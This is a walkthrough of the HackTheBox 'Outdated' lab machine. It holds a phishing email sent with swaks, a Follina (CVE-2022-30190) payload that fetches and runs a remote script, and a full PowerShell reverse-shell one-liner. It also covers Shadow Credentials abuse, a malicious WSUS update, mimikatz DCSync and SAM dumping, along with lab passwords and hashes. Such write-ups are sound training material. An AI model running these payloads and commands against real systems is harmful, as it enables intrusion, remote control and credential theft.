---
title: Outdated [Medium]
date: 2025-08-26
categories: [HackTheBox, OSEP]
tags: AD Windows
img_path: /assets/Images/HTB_Outdated/logo.png
image:
  path: /assets/Images/HTB_Outdated/logo.png
---

# Outdated [Medium] [OSEP]

![Screenshot 2025-08-26 at 10.00.08 PM.png](/assets/Images/HTB_Outdated/Screenshot_2025-08-26_at_10.00.08_PM.png)

## 🤨 Enumeration

```bash
nmap -T4 -vv -sC -sV -oN nmap/intial $IP
```

```bash
PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-26 19:26:39Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-26T19:28:20+00:00; +1h39m07s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Issuer: commonName=outdated-DC-CA/domainComponent=outdated
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-26T18:58:46
| Not valid after:  2026-08-26T18:58:46
| MD5:   f839:00e9:8dab:742c:de8c:7d49:557c:e458
| SHA-1: 15fc:1fd2:0e0e:3a5f:db45:b613:e83f:a288:dd13:23d6
| -----BEGIN CERTIFICATE-----
| MII...i3x2
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-26T19:28:21+00:00; +1h39m07s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Issuer: commonName=outdated-DC-CA/domainComponent=outdated
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-26T18:58:46
| Not valid after:  2026-08-26T18:58:46
| MD5:   f839:00e9:8dab:742c:de8c:7d49:557c:e458
| SHA-1: 15fc:1fd2:0e0e:3a5f:db45:b613:e83f:a288:dd13:23d6
| -----BEGIN CERTIFICATE-----
| MIIF...+i3x2
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
8531/tcp  open  unknown       syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49912/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49935/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49959/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14947/tcp): CLEAN (Timeout)
|   Check 2 (port 43137/tcp): CLEAN (Timeout)
|   Check 3 (port 50523/udp): CLEAN (Timeout)
|   Check 4 (port 11585/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1h39m05s, deviation: 2s, median: 1h39m06s
| smb2-time: 
|   date: 2025-08-26T19:27:38
|_  start_date: N/A

```

in the Nmap output we see a another domain name `mail` on the mail port number

```bash
mail.outdated.htb
```

Guest Auth is working we can list the shares

```bash
nxc smb 10.129.229.239 -u 'a' -p ''  --shares
```

![image.png](/assets/Images/HTB_Outdated/image.png)

Using smbclientng to login 

```bash
smbclientng -u 'a' -p '' --host 10.129.229.239
```

![image.png](/assets/Images/HTB_Outdated/image%201.png)

We can test the mail server by giving out IP 

```bash
nc -lnvp 80
```

```bash
swaks --to itsupport@outdated.htb --from pain@mewo.htb --server mail.outdated.htb --body "http://10.10.14.109/" --header "Subject:Internal Web App request"
```

So as netcat output says its a WindowsPowershell that is used to connect to us back

By the Version of WIndowsPowerShell there is a Famous Exploit `MSDT 0-day`

![image.png](/assets/Images/HTB_Outdated/image%202.png)

Output -

```bash
nc -lnvp 80           
listening on [any] 80 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.229.239] 49887
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.906
Host: 10.10.14.109
Connection: Keep-Alive
```

```bash
WindowsPowerShell/5.1.19041.906
```

## 🔱 Initial Access

### **MSDT 0-Day CVE-2022-30190**

**CVE-2022-30190 (Follina) – MSDT Exploit**

CVE-2022-30190, also known as *Follina*, is a remote code execution vulnerability in Microsoft’s Support Diagnostic Tool (MSDT). The issue lies in how MSDT handles specially crafted `ms-msdt` URIs, which allow attackers to execute arbitrary commands.

The most common delivery method is a malicious Microsoft Word document. Instead of relying on macros, the attacker embeds an external reference in the document’s XML (`document.xml.rels`). When the document is opened, Word automatically retrieves a remote HTML file controlled by the attacker. That HTML payload then abuses the `ms-msdt` protocol handler to invoke PowerShell and execute malicious commands.

What makes Follina particularly dangerous is that it works even with Office macros disabled and in Protected Mode. In some cases (like RTF files), simply previewing the document is enough to trigger the exploit. Once executed, the attacker gains code execution with the same privileges as the user, which can lead to data theft, persistence, or further privilege escalation.

This vulnerability highlights how a seemingly harmless feature like MSDT can be weaponized to bypass traditional defenses and compromise systems with minimal user interaction.

![image.png](/assets/Images/HTB_Outdated/image%203.png)

[https://github.com/chvancooten/follina.py.git](https://github.com/chvancooten/follina.py.git)

A Very explained about this exploit 

[Exploiting MSDT 0-Day CVE-2022-30190](https://youtu.be/dGCOhORNKRk?si=0UI_-9X8qsWJUF8S)

[CVE-2022-30190 (Follina) explained](https://www.hackthebox.com/blog/cve-2022-30190-follina-explained)

```bash
git clone https://github.com/chvancootne/follina.py.git
```

![image.png](/assets/Images/HTB_Outdated/image%204.png)

Using this tools to generating a `rtf` file which has this `malicious code` to get a reverse shell

This tool will host a html file on the localhost port 80 we can download it 

```bash
python3 follina.py -m command -t rtf -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.109/rev.ps1')"
```

![image.png](/assets/Images/HTB_Outdated/image%205.png)

```bash
http://localhost:80/exploit.html
```

![image.png](/assets/Images/HTB_Outdated/image%206.png)

```bash
<script>
    location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMAA5AC8AcgBlAHYALgBwAHMAMQAnACkA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
</script>
```

![image.png](/assets/Images/HTB_Outdated/image%207.png)

Save it to www folder !

```bash
curl http://localhost:80/exploit.html -o www/index.html
```

Lets make a rev.ps1 so the phishing will go like this 

Send mail → a request back from the user → takes our rev.ps1 → Revese shell

so why it is important is so if the defender blocks that rev.ps1 we will know that 

but if we try to get it from 1 go there must be chances 

```bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',2004);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![image.png](/assets/Images/HTB_Outdated/image%208.png)

Host the index.html

```bash
python3 -m http.server 80
```

Send the Mail

```bash
swaks --to itsupport@outdated.htb --from pain@mewo.htb --server mail.outdated.htb --body "http://10.10.14.109:8080/" --header "Subject:Internal Web App request"
```

![image.png](/assets/Images/HTB_Outdated/image%209.png)

Got the reverse shell

i used sliver for persistences its totally optional

After i always take a sliver session just in case i loose that reverse shell

![image.png](/assets/Images/HTB_Outdated/image%2010.png)

after the reverse shell first thing is to grab the NTLMv2 hash 

and try to crack it

```bash
dir \\10.10.14.109\pain
```

```bash
responder -I tun0
```

![image.png](/assets/Images/HTB_Outdated/image%2011.png)

NO Success

```bash
hashcat -m 5600 -a 0 btables_NTLMv2 /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/Images/HTB_Outdated/image%2012.png)

Collect Bloodhound data in a very quick way

```bash
sharp-hound-4 -- '-c all,GPOLocalGroup'
```

![image.png](/assets/Images/HTB_Outdated/image%2013.png)

You can upload `SharpHound.exe` and do the same thing ! 

### Shadow Credentials Attack

The Shadow Credentials attack abuses Active Directory’s `*Key Credential Link* attribute`, which is normally used for certificate-based authentication (like smart cards). An attacker with the right permissions can add their own malicious `certificate` to a target account’s attributes. This effectively gives them persistent access, since they can now authenticate as that user using the added certificate — even without knowing their password or hash. It’s stealthy, hard to detect, and a powerful way to maintain long-term access.

![image.png](/assets/Images/HTB_Outdated/image%2014.png)

Adds a malicious certificate to the `sflowers` user’s KeyCredentialLink attribute, enabling certificate-based logon.

```bash
.\Whisker.exe add /target:sflowers /domain:outdated.htb /dc:dc.outdated.htb
```

![image.png](/assets/Images/HTB_Outdated/image%2015.png)

Uses the injected certificate to request a TGT for `sflowers`, proving successful persistence via Shadow Credentials.

```bash
.\Rubeus.exe asktgt /user:sflowers /certificate:MIIJu...<SNIP>...xsHaGL7gICB9A= /password:"HThy7lv4XuCMm8mE" /domain:outdated.htb /dc:dc.outdated.htb /getcredentials /show
```

![image.png](/assets/Images/HTB_Outdated/image%2016.png)

Validates access by connecting over SMB with `sflowers`’ NTLM hash, showing the account is fully compromised.

```bash
nxc smb $IP -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
```

![image.png](/assets/Images/HTB_Outdated/image%2017.png)

Using evil-winrm to login in the machine

```bash
evil-winrm -i 10.129.229.239 -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

![image.png](/assets/Images/HTB_Outdated/image%2018.png)

Sliver Session [Optional]

![image.png](/assets/Images/HTB_Outdated/image%2019.png)

We can see this user have READ,WRITE on UpdateServicesPackages share 

```bash
nxc smb 10.129.229.239 -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5' --shares -k
```

![image.png](/assets/Images/HTB_Outdated/image%2020.png)

## 💀 Priv Esc

### WSUS Explotation

WSUS (Windows Server Update Services) is used to centrally manage and deploy Windows updates across an organization. If attackers gain administrative rights over WSUS, they can abuse it to push *malicious updates* to connected endpoints. Instead of delivering trusted patches, WSUS can be tricked into distributing backdoored executables or payloads, giving attackers code execution on multiple systems at once. Since updates are normally trusted, this attack is stealthy and highly impactful.

![image.png](/assets/Images/HTB_Outdated/image%2021.png)

if we run winpeas 

Shows that the user has **AllAccess permissions** on WSUS log files, confirming WSUS administrator rights — a prerequisite for exploitation.

```bash
==>  C:\Program Files\Update Services\LogFiles\Change.log (WSUS Administrators [Allow: AllAccess])

==>  C:\Program Files\Update Services\LogFiles\SoftwareDistribution.log (WSUS Administrators [Allow: AllAccess])
```

![image.png](/assets/Images/HTB_Outdated/image%2022.png)

![image.png](/assets/Images/HTB_Outdated/image%2023.png)

You need to complie this Binary by your self

[https://github.com/nettitude/SharpWSUS.git](https://github.com/nettitude/SharpWSUS.git)

[SharpWSUS.rar](/assets/Images/HTB_Outdated/SharpWSUS.rar)

Enumerates and inspects WSUS configuration using **SharpWSUS**, verifying if the service can be abused for malicious update injection.

```bash
.\SharpWSUS.exe inspect
```

![image.png](/assets/Images/HTB_Outdated/image%2024.png)

Example Commands

![image.png](/assets/Images/HTB_Outdated/image%2025.png)

Create an update (NOTE: The payload has to be a windows signed binary):

```bash
SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date:[YYYY-MM-DD] /kb:[KB on update] /rating:[Rating of update] /msrc:[MSRC] /description:[description] /url:[url]>
```

Example

```bash
SharpWSUS.exe create /payload:"C:\Users\Test\Documents\psexec.exe" /args:"-accepteula -s -d cmd.exe /c ""whoami > C:\test.txt""" /title:"Great Update" /date:2021-10-03 /kb:500123 /rating:Important /description:"Really important update" /url:"https://google.com"
```

i already added my shell.exe in `C:\Tools\shell.exe` to get a sliver session

and for Psexec.exe there was already in the Desktop folder of `sflower`

```bash
C:\Users\sflowers\Desktop> .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c ""C:\Tools\shell.exe""" /title:"Great Update" /rating:Important /description:"Really important update"
```

![image.png](/assets/Images/HTB_Outdated/image%2026.png)

Approves a malicious update for the target DC under the group "Great Update"  

```bash
.\SharpWSUS.exe approve /updateid:089b7bcb-17ec-4975-859b-fdbb0683a57d /computername:dc.outdated.htb /groupname:"Great Update"
```

![image.png](/assets/Images/HTB_Outdated/image%2027.png)

Checks whether the approved malicious update was successfully applied on the target DC  

```bash
.\SharpWSUS.exe check /updateid:089b7bcb-17ec-4975-859b-fdbb0683a57d /computername:dc.outdated.htb
```

![image.png](/assets/Images/HTB_Outdated/image%2028.png)

Update is not installed after wating some time 

![image.png](/assets/Images/HTB_Outdated/image%2029.png)

We will get this “Update is installed”

![image.png](/assets/Images/HTB_Outdated/image%2030.png)

Sliver Shell Poped Up !

![image.png](/assets/Images/HTB_Outdated/image%2031.png)

```bash
sideload /opt/Binarys/mimikatz.exe '"lsadump::dcsync /user:outdated\administrator /domain:outdated.htb"' "exit"
```

![image.png](/assets/Images/HTB_Outdated/image%2032.png)

One-Linear for getting User and root flags without even login manually

User.txt

```bash
nxc smb 10.129.229.239 -u Administrator -H '716f1ce2e2cf38ee1210cce35eb78cb6' -x 'powershell -c "Get-ChildItem -Path C:\users -Recurse -Force -Filter user.txt -ErrorAction SilentlyContinue | % { Write-Host \"Found at: $($_.FullName)\"; Get-Content $_.FullName }"'
```

Root.txt

```bash
nxc smb 10.129.229.239 -u Administrator -H '716f1ce2e2cf38ee1210cce35eb78cb6' -x 'type C:\Users\Administrator\Desktop\root.txt'
```

![image.png](/assets/Images/HTB_Outdated/image%2033.png)

---

## Beyond Administrator

There was one more method to get the btabels password and doing Shadow Credentials Attack

We have Read Access to SAM 

```bash
icacls C:\windows\system32\config\SAM
```

![image.png](/assets/Images/HTB_Outdated/image%2034.png)

Using HIveNightmare to get all the `sam`, `security`, `system` files

```bash
PS C:\Tools> iwr http://10.10.14.109/HiveNightmare.exe -OutFile HiveNightmare.exe
PS C:\Tools> .\HiveNightmare.exe
```

![image.png](/assets/Images/HTB_Outdated/image%2035.png)

Download 

```bash
download SAM-2023-12-13

download SECURITY-2023-12-13

download SYSTEM-2023-12-13
```

![image.png](/assets/Images/HTB_Outdated/image%2036.png)

Using Secretsdump and we get the password 

```bash
secretsdump.py -sam SAM* -security SECURITY* -system SYSTEM* local
```

![image.png](/assets/Images/HTB_Outdated/image%2037.png)

```bash
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d805ad109346699956d56bf7ff7aad7a
[*] DefaultPassword 
(Unknown User):5myBPLPDKT3Bfq
```

Using Certipy and to automate the whole process of Shadow Credentials Attack

If you get NT hash : None just sync the time

```bash
certipy shadow auto -u btables@outdated.htb -p '5myBPLPDKT3Bfq' -account sflowers
```

![image.png](/assets/Images/HTB_Outdated/image%2038.png)

Sync the time using ntpdate

```bash
ntpdate $IP
```

Again using certipy doing Shadow Credentials Attack

```bash
certipy shadow auto -u btables@outdated.htb -p '5myBPLPDKT3Bfq' -account sflowers
```

![image.png](/assets/Images/HTB_Outdated/image%2039.png)

```bash
1fcdb1f6015dcb318cc77bb2bda14db5
```

---

### `Author : PaiN`